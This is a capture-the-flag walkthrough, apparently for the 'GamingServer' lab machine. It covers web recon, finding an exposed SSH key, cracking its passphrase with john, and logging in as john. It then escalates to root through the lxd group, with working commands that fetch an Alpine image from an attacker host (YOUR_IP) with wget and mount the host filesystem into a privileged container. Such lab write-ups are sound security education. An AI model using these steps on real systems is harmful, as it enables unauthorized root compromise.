# GamingServer


# Recon

- Nmap Findings:
      - Found two open ports and no exact OS found.
      - Port 80, and 22. Http and SSH.
  
  <img width="704" height="336" alt="image" src="https://github.com/user-attachments/assets/7c90b3cc-6324-4a99-80d6-4092478b367b" />

- Gobuster findings:
      - Found /uploads page and /secret page. 
  <img width="759" height="381" alt="image" src="https://github.com/user-attachments/assets/0e39569f-41dc-4295-a0ad-ad29b9fefc9e" />
<img width="801" height="322" alt="image" src="https://github.com/user-attachments/assets/65e9c558-616b-43e0-a22b-6c6841cfcdfa" />

- There is a secretkey in the secret page we can use possibly.
<img width="609" height="490" alt="image" src="https://github.com/user-attachments/assets/80237710-6814-4be7-b07c-026781dd58fe" />

- Homepage recon
    - Looking at the homepage we don't really see much, and it's in a different language.
      
  <img width="1223" height="840" alt="image" src="https://github.com/user-attachments/assets/a60b610f-2701-4e76-8055-3c9ba8294c7a" />

    - If we look at the source code we might be able to find something hidden or something sometimes.
    - At the foot of the source code we see a little note, and it mentions a name, john. 
      
      <img width="818" height="81" alt="image" src="https://github.com/user-attachments/assets/a619c21b-bebd-4b95-8c7d-efe4bf3d8ba8" />


# Weaponization/Exploitation 

 - So knowing we have a username, and a key; We could try to get in via SSH using these credentials if they're for john.

   <img width="1311" height="458" alt="image" src="https://github.com/user-attachments/assets/c7c1894e-aa54-429b-b3f9-4d41c8ee6b72" />

 - But first we will need to crack the passphrase on the key, <img width="476" height="59" alt="image" src="https://github.com/user-attachments/assets/91d8780d-96dd-4b90-9e8a-162b3c7607f0" />

 - Using ssh2john, and john we can do so.

<img width="654" height="329" alt="image" src="https://github.com/user-attachments/assets/0c1b5a48-70ee-47dc-8462-4c398d83d15b" />


- And we try with ssh again, using the passphrase we just cracked to attempt to login

  <img width="687" height="373" alt="image" src="https://github.com/user-attachments/assets/c7002401-4074-4aff-bc98-02f33003e5fd" />

- It worked, we are in as john.

  <img width="767" height="379" alt="image" src="https://github.com/user-attachments/assets/08fcc32e-98c4-4bbe-8151-8be09e079d0b" />

- Our first flag is here.

# Privilege Escalation


- We tried to run sudo -l as john, but we are unable too, too a look using ls -la and see that john possibly has ran sudo before though

 <img width="614" height="313" alt="image" src="https://github.com/user-attachments/assets/6ba7fc49-baac-4661-a729-f9ccd7e711e5" />

- We might be able to use the .bash_history to find something useful.
- No luck

- Checked id

uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)

- Excellent! John is in the lxd group - this is a well-known privilege escalation vector!

  # Download and build Alpine image
git clone https://github.com/saghul/lxd-alpine-builder

<img width="615" height="194" alt="image" src="https://github.com/user-attachments/assets/53c7b8f8-d388-48a6-a8c2-10b0d212cf25" />

cd lxd-alpine-builder
./build-alpine

<img width="626" height="88" alt="image" src="https://github.com/user-attachments/assets/de3294f4-a87a-43a3-b2cc-8cbf63b7ad8f" />

# On your machine
python3 -m http.server 8000

<img width="508" height="74" alt="image" src="https://github.com/user-attachments/assets/07a56a7c-dd10-4137-a884-7133a8966950" />

# On target
cd /tmp
wget http://YOUR_IP:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz

<img width="695" height="286" alt="image" src="https://github.com/user-attachments/assets/017c3cc4-a4f3-4a7e-8230-9c01333a67f6" />

# Import the image
lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage

<img width="661" height="331" alt="image" src="https://github.com/user-attachments/assets/1389784e-353c-4874-8fa7-90e2d3d59475" />

# Check it imported
lxc image list

# Create and configure container
lxc init myimage ignite -c security.privileged=true

# Mount host filesystem
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true

# Start container and get shell
lxc start ignite
lxc exec ignite /bin/sh

# You're now root! The host filesystem is at /mnt/root

<img width="662" height="260" alt="image" src="https://github.com/user-attachments/assets/85c85f53-78e4-4c5a-81ce-a12565857165" />

We can search for the "root.txt" flag


<img width="381" height="134" alt="image" src="https://github.com/user-attachments/assets/6e67ac37-5906-419b-b563-1f2319739d1a" />






 

  

